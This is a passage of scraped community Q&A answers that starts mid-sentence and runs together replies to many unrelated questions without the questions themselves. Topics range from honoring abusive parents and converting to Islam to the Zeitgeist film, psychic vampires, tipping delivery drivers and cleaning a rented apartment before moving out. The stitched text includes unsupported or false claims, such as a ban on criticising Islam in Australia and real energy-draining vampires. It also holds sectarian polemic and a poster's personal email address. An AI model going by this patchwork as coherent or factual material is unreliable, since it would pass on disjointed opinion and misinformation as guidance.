you'.  You smile.  All of this makes the world run smoother.  You do it almost automatically.  You call the policeman sir or ma'am even when it looks like he enjoys writing the ticket, etc.  All this is extrinsic and your parents deserve that.    You have an obligation to respect your parents because a) they are old and fast becomig vulnerable to your greater strength and b) they gave you life--even if they made it hell.    You respect your parents by not dishonoring them.  You respect your parents by not making an *** of yourself thus causing people to say 'What kinda mama did she have?'  You respect your parents by admitting that even if they aren't perfect you are made up of parts of them (genes) and would not be here without them.    If they took your childhood do you want to give them your adulthood too?|`|sFAtAWE8aa	Yes. But it is also a Christian sin to act willfully against your master as a slave.|`|g4AAZRuxaa	Children are to honor their parents if abused I don't think it applies.|`|AA10676836	How can anyone say you must love someone? That does not make sense to me. Love is an emotion I have toward someone. It cannot be commanded.|`|wFlObEjcaa	who says you have to automatically respect your parents, they have to earn your respect, just because they pumped out some kids does not make them respectable in any sense, if they provided you with love, food, shelter and education, then you give them respect, if mommy was busy getting drunk and dad was banging the UPS guy, then they deserve no respect|`|G49lKR56aa	First off would you like to be?  Your grandparents need to back off some what. God says to honor your parents. That sometimes is the hardest thing to do in life with parents like you described. I have parents close to that!  Any and all will "rot in hell" if they do not take the Lord Jesus as their personal Lord and Savior. That put you there with them, and with history's baddest like hitler, jim jones, jeffery dalmer, etc....  That's something people don't think about, or say at least I'll be in good company!

And no, you're not bound to "love" such people.|`|R4RsQxJEaa	The simple answer is, God calls us to love everyone, including our enemies. Loving them does not mean you have to submit to abuse or condone their actions.

Don't do anything overtly mean to your parents and you're ok.    It really doesn't matter though.  All you have to do is believe in Jesus as your lord and savior (if your catholic you'll also have to go through confession and repent) and you're good to go!  You can kill as many people as you want and it doesn't matter!  Just honestly believe in Jesus as your savior and you're good to go!|`|ffb16e0ffc6a4152dbf3d94c25cd5995aa	They have to honor their parents, not love.

If it's someone who works hard and does well in school so they can go to a good college or technical school, and get a career in something they actually love, who the hell cares?  From my experience, the "nerds"  that I grew up with all have good degrees and are top-earners. All those popular jocks and popular girls?  Wal-mart careers, baby, Wal-mart.  Its sounds cliche, but its true.  All those kids that worried about what other kids were doing and fitting in, often don't have the courage to think for themselves.  They worry too much what others think of them.  To be successful you have to have the personal strength to do what *you* want to do and not care what others think.

d20feb0d03f94b65cc82fb1a12566011aa	I consider Zeitgeist to be an intellectually dishonest documentary, not because of the filmmakers personal bias, but because of its disregard for the truth. There is so much questionable statements that can easily be refuted, or controversial points that have legitimate opposing views that should have been presented.    - Regarding part 1: Jesus    The "Mythology of Jesus" theory was an obscure and generally dismissed theory.   It has gained exposure due to author "Acharya S" and her collaboration with the Zeitgeist filmmaker. (She is also author of the films companion guide). But even the casual but astute viewer will find considerable silliness in the some of the conjectures where practically any numerical or astrological connection 'proves' mytholical derision. Son=sun? Three stars in Orions belt = three kings? Virgo = Mary because the astrological sign sort of looks like an M? Who buys this stuff?    Some other views:    " The idea of Jesus as a myth is rejected by the majority of biblical scholars and historians. In 2004, Richard Burridge and Graham Gould stated that they did not know of any "respectable" scholars that held the view today. Robert E. Van Voorst has stated that biblical scholars and historians regard the thesis as "effectively refuted"."    http://en.wikipedia.org/wiki/Jesus_myth_...    For a point-by-point analysis, see http://www.conspiracyscience.com/article...    For more rebuttals, see http://webskeptic.wikidot.com/zeitgeist-...      - Regarding Part II: 9/11    It should be noted upfront that being skeptical of the 'official version' of anything presented by the government or media, is a good thing for society. And it should also be noted that questioners of 9/11 'offical versions' range from genuine intellectual pursuits of greater truths, to bizarre interpretations specifically intended to support a unwavering point of view.     The Zeitgeist filmmaker is part of that spectrum that has bought into the theory that the government orchestrated the whole thing. Unfortunately the evidence they selected and presented was sloppy and much of it easily disproved, even by members of the Truth movement. (I've heard some speculate this may have been a red-herring to discredit the 'truth' movement).    For a point by point analysis, see http://www.conspiracyscience.com/article...        - Regarding Part III: Men behind the curtain    As a liberatarian, I found this part to have had the most potential in exposing abuses of government and men in power. Instead, it trots out tired long disproven conspiracy theories.     "Income Tax law Doesn't exist" theory - Very stale. Consistently disproven over-and-over again. No new information, just new victims going to jail that fall for these arguments. Very sad.     "Federal Reserve System is owned by international bankers" - Still a common conspiracy theory. Still wrong. The Federal Reserve System, is headed by the Board of Governors, a Government Agency (look it up - http://www.whitehouse.gov/government/ind... ). The Federal Reserve branches can definitely be considered tightly regulated corporations owned by their member banks, all of which must be American-owned by law. It is receives regular audits, and is overseen by congress.     For a point-by-point analysis, check out:  http://webskeptic.wikidot.com/zeitgeist-...  http://webskeptic.wikidot.com/zeitgeist-...  http://webskeptic.wikidot.com/zeitgeist-...    Other views:    "There is no shortage of information which refutes this viewpoint. But this type of conspiracy relies on two elements common to web surfers: First, they're only willing to check facts at the most superficial level, which usually means they'll read a message or watch a clip just once before forming an opinion and moving on.

"...(a) common problem in the film: presenting something in such a shallow manner without further corroboration or scholarly evidence." - Ref:   http://gauntlet.ucalgary.ca/story/12284    There are those who defend the film because they believe that agenda+motive is more important than truth.

I had known more scholarly research which made a lot more sense than the whole "Jesus was a complete mythical story borrowed from pre-existing legends and astrology" thing.    There was some good stuff, but the square pegs being shoved down my throat made the whole thing hard to swallow. The similarity to existing legends was good, though, and that had been presented previously in other research to a large degree.

Turn away from him and the sin that you committed while with him, ask Allah's forgiveness and live a life pleasing to him. Boy friends are not allowed in Islam and if you seek Allah's will for your life he will give you a good husband. Go to the masjid (mosque) and speak to some sisters there maybe they can point you in the right direction. Also I think their is a sister from Australia on this site who can help guide you to a good Masjid.  the  islamicummah.ning.com, I think that is the proper site. may Allah make things easy for you.

They regard women as second class citizens  - You're converting out of fear, it is called "Stockholm Syndrome", but this Stockholm Syndrome is on a global scale, if you in Europe, it is more serious there.  This syndrome is psychological survival mechanism.  To cope or survive, you start identifying with the oppressor/captor.  You live in Australia, I do not know how much influence Muslims have there, but I know it's illegal to criticize Islam, (Sounds like Sharia has invaded Australian court systems!!!)   - If you Converted to Judaism, Christianity or Buddhism, you wouldn't need to change your name.  (Christians stopped this practice about 200 years ago), There are only two religions are encourage you to accept a new name; Islam and Wicca (aka Witchcraft)  - In Christianity, everyone is accepted, the marriage/divorce status has nothing to due with Church membership, or salvation.    "I asked an Imam but he said I need to make final divorce settlements with him and then when I am ready I can be a Muslim." Seriously, what kind of religion have a rule like this??  That is clearly oppressive.  You would NEVER hear a pastor say "You need to make final divorce settlements with him, then you'll be ready to be a Christian"  You would most likely hear "You are ready to accept the Lord Jesus Christ, as your Lord and personal savior, at any time..."    You need to seriously think about this....|`|A5HPUGxraa	congratulations dear happy for you    first of all a boyfriend shouldn't think this way (i hope he is not dangerous) and if he is just a boy friend he is not a husband so you do not have to prove divorce!!! if he is a husband you will need a divorce that simple you will need to tell him explicitly that you have to break up with him  this either you converted or not it seems like he doesn't treat you well    secondly about the name you do not have to it is only if you have a name that has a meaning against islam and this is rare if you prefer to do it you can choose whatever name you like or names from the prophet muhamed' family (fatima, khadija, ayisha..) my name is not from these names it is not islamic because there is no an islamic name for women be sure of that there is no single problem in your name    an information you will need mosques are not necessary for women it is different from the concept of the church in christianity men should go but women voluntarily do it this is an important info for you  there are some rule to enter a mosque (it is the house of god) so it is better to cover your body and you hair   men and women are shy (shyness is the manner of islam) they so if you noticed that the imam doesn't look at you this doesn't mean he is ignoring you and if you noticed he gives you quick answers don't feel he is saying hey girl walk away nop be sure of that this has nothing to do with being rude.. and if you really did feel he is you just do not have to go to mosque as i told you  and about the fact that he told you to wash he didn't mean to be rude telling you you are dirty noooooooo lol it is a procedure before telling the shahada when you go to the mosque that's all (you will know about this later)     about filling papers this is just for statistics or so nothing more i guess i don't think you will nedd this step too (but tey to ask someone who went through it just for your knowledge that's all)     now moving to converting   the first thing to do is to say 'ashhadu ana la ellaha ella allah wa ana muhamadon rasouloullah' or 'there is no god but allah -there is a single god- and his prophet is muhamed' please be sure that "It is not a must for some one to declare the Shahadah in front of Muslim witness or even in the Mosque. A person does not need to do a course or obtain a certificate to become a Muslim". i'm a muslim and i know what i'm saying search shariahway site and islamicboard site we all are your witnesses here do not worry    then you need to learn about islam so steps you need to make could be:   - it is not necessary but you can search for a good mosque (or even an islamic center) or the nearest one to start to see muslims and know about prayers, Qur'aan and islam more ( in your case you can forget this step you just need to be in touch with some muslims community in any way social networking, TV channels...)  - try to read as much as you can about islam even from the internet  - search the internet to know more about islam and to know other muslims who can support you and give you more information about islam try social networking sites also i can introduce you to some who converted  - above all is to understand that a muslim in islam is the person who doesn't harm either by his mouth or hand' not the one who worship god more so please focus on how to live a special life especially god showed you the right way and try to make a value added  - try to download Qur'aan or check this http://quranexplorer.com/quran/ and listen to it this will heal a lot.. personaly i adore Qur'aan it makes me feel i'm flying and gets me out of any troubles, anger, worries.. it heals your soul in brief  - try to communicate with other muslims do not isolate yourself this is more healthy   - and to convert to a muslim is not a bed of roses you will hear and see a lot of critics a lot of resistance and this happens when you make any change in general    five pillars of islam are:  - to say shahada or to believe that there is one god and his prophet muhamed 'ashhadfu ana la ellah ella allah wa ana muhamadon rasoul allah' (in the same time you must beleive in all other religions and prophets all of them)  - to pray (five times a day)   - to give charity (once a year)   - to fast ramadan (a muslims month in hejri calendar)  - to go to mekka even once in your life (only if you can afford it)    these are links i found that may help you:  - http://www.muslimconverts.com/  - http://www.islamicbulletin.com/intro.htm  - http://islamworld.net/docs/become.html  - http://www.wikihow.com/Become-a-Muslim  and these show how to pray:  - http://arabic.speak7.com/prayer.htm  http://islam.about.com/c/ht/01/03/How_Pr...   - http://www.bahagia.btinternet.co.uk/pray...     for TV channels in english i searched google and found   http://www.intoislam.com/islam/Islamic/M...  http://www.tvchannelsfree.com/watch/3241...   good luck dear .. feel free to contact me anytime|`|Wgsl0hVLaa	Alhumdullilah, Allah has shown you the right way and has brought you from the false to the truth. you have nice ideas for baby names. you can divorce him as you must do this for the sake of Allah to seek the reward. i can give you further information about Islam if you are intrested.    i wish i could tell you but i live in England :(    asalama alaykum sis! best wishes for your future. always remember to be happy with your religion as this is the only (true) religion that makes your heart finds rest and leaves it with peace. Islam has many rules but if we follow them we will see that life will become easier for us and will benefit us for the hereafter.    no boy/girl friends, this is forbidded in Islam  no music is permitted  no alchohol....    things like that the Prophet Muhammad (sallalahu alayhi wasalam) came down to tell us to stay away from the devil who leads us to these things.    The Prophet (peace be upon him) also reportedly said, "Whenever a man is alone with a woman, Satan (Shaytan) is the third among them" (Tirmidhi).  When young people are getting to know each other, being alone together is a temptation toward wrongdoing.     Hadrat Umar (RA) related that the Prophet Muhammad (peace be upon him) said, "Not one of you should meet a woman alone unless she is accompanied by a relative (mahram)" (Bukhari/Muslim).|`|J6JFiNL8aa	first...he NEVER owned you....thats all i haVe to say|`|0hT85XLzaa	Do you know the 5 pillars of Islam and no mosque is better than another. Every mosque is holy and they are all good.    Oh and there is no such thing as a "Muslim name". There are Arabic names. You can keep your name if you like it, as long as it doesn't contradict your Islamic faith.|`|X5gmVvMDaa	first of all having a boyfriend in Islam is Haram (forbidden) and if you want to be a Muslim he can not stop you for that he does not own you. Allah will punish him if he tries to prevent you. just make sure you are becoming a Muslim for the right reasons and not for a man!      as for the names I like tha name Ayah, and Mariam they are both pretty they all are but i like those names the most...    If you want to find a mosque in your area go to Islamicfinder.com u can find a mosque in ur location if there is one and Im sure there is I know a lot of Australian Muslims!        EDIT:IF he is ur Boyfriend then why the divorce just tell him to leave and kick him away! again Dating and having boyfriends is Haram! wrong not allowed in Islam!      Edit: if ur going to become Muslim consider urself as a revert not Convert. In Islam we are all born Muslim but some of us are raised as Christians or by another religion because of our parents...    Converts are the ones that become Muslim for the wrong reason such as men...    Revert is one that returns to the right path that he was born into.|`|CQz8dMzFaa	How can you divorce your boyfriend??? That's silly. Just ask for forgiveness and dont ever date again(its unlawful).If you have had premarital sex, then yes, do the ghusl, and repent once again.    You want to go.. where?    Get a copy of the Quran if you havent already.  Consult another imam. Best to consult a scholar. One with a degree in Islamic studies. One who doesnt follow sects.   I like Iman(it means faith). Tbh though, dont bother changing your name. It'll be a hassle to your family and friends. There's no such obligation in Islam.

This is the best decision in your life in-shallah. I am the Imam of an Islamic Center, had a long experience with convert brothers and sisters and would like to give you some advice:    About "Muslim names". This is optional. If you are happy with your name, keep it. In fact, the Prophet, peace be upon him, did not change the names of everyone who became Muslim, just a few offensive names similar to "the Slave of the Sun" for example. If wish to take up a new name, then I would recommend that you make sure it has an Islamic significance or that it be the name of a Muslim personality. I wouldn't recommend Anoud as it's just a common name in Arabia but as far as I know it doesn't have Islamic significance. Huma is used in Pakistan but I don't recall any Islamic connotation. Iman, Aisha, Fatima, Ayah, Zainab are beautiful "Islamic" names.     Boyfriend. This should not detain you from accepting Islam. If you are convinced, do it now, and just stop living with the guy as it is not permitted in Islam. You don't know what the future would come with, so why delay embracing Islam? If you are married and want a divorce, you can do that AFTER making your shahadah, provided that you are separated from the guy.     "Some" not all imams are rude, this is sad but true. It's mainly because they come from a different culture and they never make an effort to understand the people of the local culture. This very frequent for Imams "imported" from Arab countries or the Indian subcontinent. Try to find someone who is a second or third generation immigrant, or better, an Imam who is a convert himself. Avoid by all means those who show intolerance to other Muslims, those who use the words "innovation" or those who you hear cursing other people.     Making ghusl is a sunnah for those who want to become Muslim. So it is a very good start for you.     Try to find a group of sisters of your age, who are converts like you, or are 2nd or third generation children of immigrant. This group will be very useful for you to support you through the first few months after converting.  Things might get complicated in your personal and professional life, and having such a group would be a great blessing.    Learn Islam and apply it step by step. You don't have to learn everything in order to give your Shahadah, but once you give it, try to make it a daily homework to learn something new.     Be nicer to your family. Try to become a better person. After believing in one God, faith is about treating others the best way, having better behavior.     Keep your 5 prayers, this is very important. Try to feel what you are saying in prayer, not just say it mechanically.    May Allah bless you sister.    Peace/salaam.|`|11b70cab8a6a69fef89e99846ac0cc19aa	First of all, congrats and all praises be to Allah, the Greatest.    Your ex-boyfriend must have been some sort of a jerk with age-old ideas of male domination. He never owned you, you always have the right to make your own choices and decisions. But as you are saying he was your boyfriend, not your husband, you don't need any sort of divorce settlements to do.    Well, regarding names, I always liked the name ''Aisha''.

Allah has sent prophets and messengers with many proofs throughout the ages for people to be able to clearly see with their own eyes and to be able to use their own senses the miracles and proofs pointing to the fact, Allah does in fact, exist.    Miracles of prophets and messengers of Allah have come to people through the ages. Moses (peace be upon him) showed many miracles to pharaoh and to the children of Israel. Plagues, locusts, water turning to blood, his stick becoming a snake, the voice in the burning bush and the parting of the Red Sea are clear miracles for the people of Moses time.    Again, Allah sent Jesus, the son of Mary (peace be upon him) with clear miracles for the people of his time. Speaking from the cradle while still a new born infant, creating birds from clay, curing the sick, giving sight to the blind and even bringing a dead man back to life, were all clear signs to the people to know Jesus (peace be upon him) was a messenger of Allah as was Moses before him.    Muhammad (peace be upon him) was the last and final messenger of Allah, and he was sent to all of mankind. Allah sent him with a number of miracles, not the least of which was the Quran. The predictions and prophecies of Muhammad (peace be upon him) have come true even in this century and the Quran has been used to convince even scientists of the existence of Allah.  [Please visit "Science Proves Allah": Watch video of famous scientists admit Quran is from Allah and even accept Islam]    The Quran is the best of proofs for the existence of Allah and today over one and half billion people memorize and recite from the exact text, in the exact same language it was revealed in; Arabic. More than 10 million Muslims have completely memorized the entire Quran from cover to cover, and can recite it from memory without looking at it.    Allah could have put everyone in their respective places from the very beginning, but the people would complain as to why they were thrown in Hell without being given a chance. This life is exactly that; a chance to prove to ourselves who we really are and what we would really do if we indeed had a free choice.    Allah Knows everything that will happen, but we don't. That is why the test is fair.|`|NlQhkgFCaa	MashaAllah     Welcome to Islam   May Allah always guide you on the straight path   The following can help you   http://sultan.org     Peace|`|4jglFl19aa	Who is better?   Islam or your boyfriend?    Of you feel that our religion is true, then we welcome you.  Allah says that those who convert into Muslims, the gates of heaven are always open for them.    You are surely blessed. Follow your new guidance, and ignore idiots.    Salam.  And by the way, you can find any mosque to pray in. People who are taunting you are actually Satans, becoz they want you to change your decision. Keep your faith strong! Allah Hafiz!|`|FCKYpwowaa	It's quite interesting how you can "divorce" your boyfriend? I know they dont do that in Australia!!!|`|eK0P51zkaa	May the peace and blessings of Allah be upon you    congratulations sis.  And I'm sorry about your experience with some of the Muslims.  But it might be that they are too busy with what they do, or they are miserable themselves for whatever reason, and it might also be, that you are facing hardship, and therefore sensitive.  or it can be both, that you are sensitive at this point of life, and the imaam didn't try to put any effort to help you.    Try and excuse them for what they do, do not let it mislead you.    but i am not sure if you are married to this man, or he is just your boyfriend?  If you are married then you must divorce, and how to do it is something that you can post as another question.    If you are NOT married then try not to get emotionally wrapped up.  Try your best to not allow him to irritate you, or mess with your head, or life.  Logically he is out of your life because you broke up, whatever the reason may be.  If he is still not leaving you, then this is illigal in Australia, you need to seek legal help, such as calling the police(not emergency).  And I'm DAMN serious!!!    About name change, our prophet used to change the name of those, that had a bad meaning only.  Such as, names of goddesses, or evil in nature.  Find out if your name has a bad meaning, otherwise you don't need to change it.  Also in Islaam, middle name is the fathers' name, and last name is father's family name.  i.e. Abdurrahman(the name) ibn(son of) Shawkaat (father's name) Hussain(family name).  For the girl its Amina(the name) bint(daughter of) Shawkaat(father's name) Hussain(family name).  But if the child is born out of wedlock, then the child takes mother's name and not father's. i.e. Amina(the name) Rauwla(mother's name) Rahman(family name).  If you change your name, my personal suggestion is, don't pick what others suggest to you, unless s/he is an important person to you.  Check the meaning of the name, and pick the one that has a greater meaning to YOU, and in YOUR life inshallah(by permission of Allah).    I am not in Australia to give you information about masaajid or mosques, but if you want, you can e-mail me, and I can inshallah(by the permission of Allah) write or call you for emotional and spiritual support.    And for your note,   Convert means, the one who changes from one religion to another.  Revert means, the one who was in the same religion, but didn't have enough knowledge or didn't practice and comes back to it.  But in the recent years many converts like to call themselves revert because according to Islaam we were all born Muslim.  The ones that convert for the wrong reasons, they might infact not be a Muslim because they don't have faith/belief.  But they become Muslim by name only.    And be proud you are Spanish.  Allah made you so, Alhamdulillah(thanks be to Allah).  If you get in touch with me, I can also help you take your shahada in public or in private inshallah(by the permission of Allah).  But have you made sure about the basic beliefs of Islaam? If you did, then after you take your shahada, you are to take a shower/ghusl as the imaam said and start working on your 5 daily Salaah/prayers. :)    Our prayers are with you.   with lots of love,  a Muslim sister.|`|QMA2diO1aa	ayah is a beutiful name :)  mey Allah make things easyer for u and mey allah bring u to paradise  ameen...|`|jP9n1CjJaa	@ Sarah Lioness Of Islam - Dummy, it's not haram.

Especially when it comes to choosing religion. Just follow your heart.
RJgEaRFGaa	you should google psychic vampires.  you'll get a lot of bs, but some truth is mixed in there.  i'm not one myself, but i catch myself drawing people's energy from time to time.  its quite believable to think that some people need a higher dose of this energy and have trouble processing normal energies (ex- energies you get from food and just being out in nature or in the sunlight/moonlight/ect).  about the blood thing, its simply a stronger link to a persons' 'life energy'.    most of the vampire stuff we hear about today is just people from the dark ages (and before) being superstitious... science and medicine weren't quite as well developed then|`|1wNsBNmxaa	man vampires do not exist and they are not real at all    Relic66~~~?|`|jard50Yiaa	In a sense, yes...    http://www.christiananswersforthenewage....|`|GuBF5xhDaa	not the ones you see in books and movies.|`|niLvdq0Qaa	Yes--it is possible for vamps to live amongst us--they look like you and I.

Km9QC8a9aa	If the tip has already been figured into the bill, then you do not have to give anything more.    Please note that there is a difference between "delivery charges" and a tip for the person making the delivery!|`|F3LBgfvwaa	Where I live they ask you on the phone if you want to tip them and how much. Most places they don't ask. If they don't ask, it means they haven't added the tip. Since you're paying with a credit card, you can add the tip in when you sign the receipt. There will be a line for the tip amount above the signature line. It's possible to tip in cash instead if you choose, but I don't know why you would.|`|hMygg8cnaa	they don't add the tip  you can either hand the guy cash  or when you sign the receipt,  fill out an amount  to be given to the driver.|`|LjX7plvgaa	Delivery charges will be included when you pay over the phone, but you should always give the delivery guy cash at the door! It makes them feel special like they did a good job and satisfied another happy customer!|`|HgRYP3cJaa	tip either on the card or cash. they add a delivery fee and the driver doesn't make much.|`|0PkFuZMwaa	well.if he bring it to your door instead of you meeting him outside than i would tip him 2.00.the cost of delivery is added on to your card.|`|21aKSgLLaa	usually they dont add the tip so i would tip them.. if you have to sign for it then you will see it broken down on the receipt

q5lreoiWaa	You need to leave the apartment in a state of cleamliness as close as you can manage to how you got it.  The deposit that you paid will properly be expended at least partially on such fixed expenses as repainting the walls if need be, patching any nailholes from normal wear and tear resultant in you living there  as long as you have, cleaning the carpet, replacing light bulbs, and rekeying the lock. Your left behind belongings are not your landlord's responsibility, leaving them guarantees that you will be charged extra for their removal.|`|HgRYP3cJaa	i would just make it look neat, not uber clean.|`|tDZMJue9aa	its not about looking older its about being clean, every single place i have ever lived was spotless when i moved out and the last place i had deposit down i had taken the stove door off and couldnt get it back on and the front door jam has split, but those are normal wear and tear the cleanliness was what counted and all trash should be taken off by you...i shampooed the carpets i didnt clean the windows because i never even opened them or the shades that were over them|`|aGOBuJtKaa	If you paid a cleaning deposit, that would mean you aren't required to clean out the apartment thoroughly. I would just make sure the counters are wiped, and I would still vacuum.|`|Xcri5qeTaa	Given the time, I'll leave it spotless, but someone will come in to vacuum, scrub the kitchen and bathroom, paint over holes from picture hangers, and all that. They do that every time someone vacates.    At least pick up anything that can't be vacuumed.    Scrub obvious wall marks, and do a once over on the kitchen and bath if you have time. Don't leave anything obnoxious that you could clean up.|`|7DlEN6lXaa	As a former apartment manager I can tell you that if you want to see your deposit be sure it's left as clean as when you moved in...including taking your trash and anything else you don't want out.    If you leave it dirty then you won't get your deposit back and if your next landlord asks for a reference from the last place you lived you would be give a bad reference.   Take the extra time to clean...it will be worth it in the long run.|`|8Zmt87LOaa	When I moved out of my apt I cleaned everything totally spotless.  I didn't want anyone to say anything negative about me in case I needed to rent from the same landlady again.|`|A54FZOjQaa	Screw it!!!  Landlords and apartment businesses always keep your deposit anyway.  I had mine cleaned professionally and everything was in tip top shape when i left and they still make up excuses to keep my deposit, i hate apartments.  I wouldn't do anything if i was you because they will screw you anyhow.  Make them work for your deposit.|`|oZuiq138aa	dont waste your time and be a nerd sitting on internet! pack UP!    take all the stuff you have and stuf you dont want anymore then put it in trash! if there is a damage in the partment they will take money from the deposit. but usually they call people or clean the EMPTY apartment themselves.    so leave it EMPRTY with no stuff of urs!      and hurry UP|`|S4zNEAFJaa	I've moved out of several apartments before with the full intention of cleaning everything until the place sparkled, but it never panned out that way. My new lease would always begin the day my old lease ran out, so I would have 24 hours to get everything out. I tried to make it as decent as possible within the time I was limited to. At most, I would not get my deposit back and one time I was charged an additional $50. I paid that promptly with no future repercussions. As far as leaving items there, you can do it, but you are risking further charges. Just try to straighten up as much as you can.|`|AA12042448	Clean it the way you would like the person before you to have cleaned it, not the way he or she did.

8dd8e579fd621e4b4affcc8b80072b8caa	Be careful how you approach this as you do not want to get too personal or bother people. You can not send out letters asking for donations unless you are a non-profit organization (and papers filed as such). There is no tracking of the money and accountability. Stay clear of doing that.    You can have a bake sale at school but you need several persons in charge of making sure the money goes to where it is intended - accountability. You must get the schools permission first and most schools will only allow these sale if they benefit the school directly.    If you want to help the Ronald Mc Donald house go and talk to them to find our how you can help. That is the safest way so you dont get yourself into trouble. Anytime you are collecting money you can find yourself in trouble real fast. If you want to collect clothes or toys or goods that is different. Don't do anything without talking to the charity directly.

Id' probably say that I was thankful he told me, because I always worried that a lack of a high school education was going to hold him back.    Obviously, physical labor is needed all around, and there are types of work, experience and professions which aren't taught in school. Of course we like to have a society of people who have a minimum level of education, but that certainly doesn't mean one's success and quality of life is denied them.|`|AA11598210	~~I would feel as if the student had found his calling in life and seems happy and content.

I'm a smoker and share my office with a non-smoker and have asked him if the smell bothers him.  He says he only notices it for the 1st 5 minutes or so and finds it is kind of a nice rich smell.  I only go out 3 times a day to smoke while at work and I smoke good quality tobacco.    You should think about switching offices if possible because the distraction will affect your efficiency and performance on the job.

biFCKGAcaa	Vaibhava Lakshmi Pooja is a very effective one and it should be done with utmost care. You should have tied up your Puppy outside the pooja room and should not have allowed it inside. Any you are not at mistake compleatly. I hope you know how Vaibhava Lakshmi pooja is done.     Vaibhava Lakshmi pooja is generally done on friday evening after 6.00pm. It is done for 8 weeks, i mean for 8 fridays. But you should make sure that first 3 fridays should not get any distrabance due to your dates. There is also another alternative. some people who cannot do for such long time will start pooja on one friday evening and do it for that whole week untill next friday evening. that also 8 days and can do udyapanam calling 8 muttayuduvas(which are treated as Ashta Lakshmi's)     However I suggest you not to count this week's puja and do one extra puja and it is enough. You can do another cycle of Pooja after some one year or so at your convenience and it is enough. No sin will come on you. Wish you best of luck -|`|RC5RAzykaa	squijdlay kloomflay wigshmere and you better get busy,  start from birth, rethink the whole thing over.  Your puppy did you a favor.

AA11046585	Have you ever read the book "embraced by the light"? soooooooo nice.    http://embracedbythelight.com/index.htm|`|da77c5139784fd9753b548e7374c097daa	God is the creator of everything.  The purpose in life for every man is to obey God's laws and accept Jesus as their savior who died on the cross for our sins. God's plan is that those who worship Him and share His word with the world and shine Jesus light through witnessing to those like you who are sincere about God, all become what is known as Jesus Church. Jesus is the bride groom and the Church is His bride. When it is time for Jesus to return to come take His Christian Church (all Chrisitans) back to Heaven, ( the rapture) the rest of the people who freely choose ot to follow Jesus are left behind to suffer for all eternity with satan and all his evil dooers.    Good will conquer evil no matter what the non believers say. God wants obedience from us,and with that He will reward unmeasurably those who did their best to be the best christian they can be for the Lord.     God is also fair when it comes to sin, because no one sin is greater or less than another. They weigh the same in the eyes of the Lord. In God's eyes, a lie weighs the same to Him as murder does. They are equally bad. But Jesus died on the cross to cover all of our sins so we don't have to sacrifice a lamb the way they did in the bible days to pay for their families sins every year. Jesus was the ultimate Lamb that was offered to pay for all of our sins.     All we have to do is admit being a sinner,and ask Jesus to forgive us for them. This must be done every day in prayer. We sin every day. There is no getting away from that. The bible instructs us on all aspects of how we are to live, raise our children, what to eat, what not to eat , etc.     The word bible stands for basic instructions before leaving earth. God has an unlimited amount of love for those who respect him, but He also has His limits as to what He is willing to over look with us. He has a special purpose for everyone of us, and through prayer and obedience to Him, in time He will tell everyone what that purpose is for them. It all has to do with gloryifying Him. And again rewards come to those who live for God. Our life here on earth is very short and temporay, but the goal is to gather loyal good Christian people together to spend eternity with Jesus, and God. Those who willingly choose not to follow God, they themselves choose satan over God.     Satan is all about lies and material things on earth that will perish when the last lost person dies when God cleanses this earth. But all the promises and gifts that we have in store for us for our loyality to the Lord our God, awaits us in the kingdom of heaven. We are now living in the end of times, and there is no more time for a lost person to waste.     If you are lost and living without Christ in your life, Ask Jesus today to forgive you for your sins, after admitting that you are a sinner. Then tell Jesus that you belive He died for your sins on the cross, and that He is your savior. By these words, you will be born again and saved by the blood of Christ. The old you has died and the new you has been reborn in Jesus.    Please visit my prayerline at...  http://www.freepowerboards.com/praywithc...  We have a shout box there that is an online chat line and I could join you in prayer there, or you can write me at my email address...    carolbmartin1958@yahoo.com   I do so pray that you find your way to Jesus today, and join Him and the rest of His church in heaven where we get to meet God face to face together.  God bless you in your search for the Lord.  carol|`|AA12382322	my cousin died, I'm not sure how long she was dead but it was long enough for her to have a death certificate made and a toe tag. she said she saw the doctors working on her, then floating up higher, she saw a bridge over a brook  with water that was so clear that it looked like it was made of glass. she said she could smell something that smelled so beautiful, and the music was unlike anything she had ever heard in this life.. she saw flowers of every color, colors she had never seen in this life,  she saw a gate made out of one huge pearl, that was open. she went through the gate and saw her mother (who had passed away years before) and saw Jesus, but she bowed down, and never saw his face. but she describes his feet in deep detail.  she said that he told her that it wasn't time and she had to go back, before she could refuse, she felt herself SLAM back into her body.  her death was documented by doctors and staff,  she even knew the doctor that worked on her when she died, she had not met him before going into surgery.  she was in the morgue when she came back, and she asked for the doctor (by name) and she told him everything that he had done to her during her death, and he was shocked.  normally, I don't believe too many stories about dying and coming back (like the book, embrace the light), but I know for a fact this happened. as far as what she saw, I believe she saw everything that she said she did. she is a very honest person.|`|AA11104965	I was dead for several minutes on two separate occasions as a child.

AA11183116	think about this- The following infomation relates to before Jesus (may peace and blessing from God be upon him)....Deuteronomy 18:18 "I will raise for them a Prophet like you (Moses) from among their brethren and will put My words in his mouth, and he shall speak unto them, all that I command him". ................ Let me make some comments about the above:            Christians believe that this is a reference to Jesus (peace be upon him). One important word here is "Prophet". Christians believe Jesus is the son of God not a prophet of God. Another important word is "brethren". If it were Jesus the word would have been "children" because Jesus peace be upon him came from the children of Isaac  rezmo373: Since Ismaaeel peace be upon him was the brother of Isaac peace be upon him, the reference is therefore to the children of Prophet Ismaaeel peace be upon him who will be brethren to the children of Isaac peace be upon him. Again the only Prophet from the brethren of the Jews and the Christians was Prophet Muhammad peace and blessings of God be upon him.  -  MOHAMED the most commonly used name by our global society today (named by the most greatest man ever)|`|AA11232725	Mary was descended from David. One of the interesting things to note when you compare the two genealogies given in Matthew and Luke is how God bypassed a curse He had placed on the main line of descent from David.    Jeremiah 22:30  Thus saith the LORD, Write ye this man childless, a man that shall not prosper in his days: for no man of his seed shall prosper, sitting upon the throne of David, and ruling any more in Judah.    This prophecy was given about Jeconiah who is in the Davidic line of Joseph but not Mary. Her line splits off from Joseph's at David's sons where hers comes through Nathan instead of Solomon.    So Jesus was born according to the flesh in the line of David but not in the main line of past kings. However  from his adoption by Joseph He also had the legal standing in the line of descent to the kingship of Israel.|`|AA11293573	Muslims honor and respect Jesus, son of Mary (peace be upon him and all of God's prophets).  Muslims believe that he was one in a long line of honorable Prophets, who taught his people to worship and obey the One True Lord, the Creator.  The Qur'an describes him:    He [Jesus] was no more than a servant.We granted Our favor to him,and we made him an example to the Children of Israel....    When Jesus came with clear signs, he said,"Now have I come to you with Wisdom,and in order to make clear to you some of the points on which you dispute.Therefore, fear Allah and obey me.    For Allah, He is my Lord and your Lord,so worship Him.This is a Straight Way."    (Qur'an:  Al-Zukhruf 43:59, 63-64)    Of all the prophets, Jesus is probably the most written about in the Qur'an.  Various stories in the Islamic text talk about his miraculous birth, his ministry, his disciples, and the message that he brought to his people.  